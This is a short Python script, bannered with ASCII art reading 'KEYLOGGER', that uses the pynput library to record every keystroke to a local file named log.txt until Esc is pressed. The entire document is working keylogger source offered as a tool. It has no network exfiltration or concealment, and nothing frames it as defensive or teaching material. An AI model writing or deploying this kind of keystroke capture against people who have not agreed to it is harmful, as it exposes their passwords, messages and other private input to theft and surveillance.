from pynput.keyboard import Key, Listener
"""
██░░██░▄█████░██░░██░░░██░░░░░▄█████▄░▄██████░▄██████░▄█████░█████▄
██░░██░██░░░░░██░░██░░░██░░░░░██░░░██░██░░░░░░██░░░░░░██░░░░░██░░██
█████░░█████░░▀████▀░░░██░░░░░██░░░██░██░░███░██░░███░█████░░█████▀
██░░██░██░░░░░░░██░░░░░██░░░░░██░░░██░██░░░██░██░░░██░██░░░░░██░░██
██░░██░▀█████░░░██░░░░░██████░▀█████▀░▀█████▀░▀█████▀░▀█████░██░░██
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
"""

def on_press(key):
    try:
        with open("log.txt", "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open("log.txt", "a") as f:
            f.write(f"{key}")

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
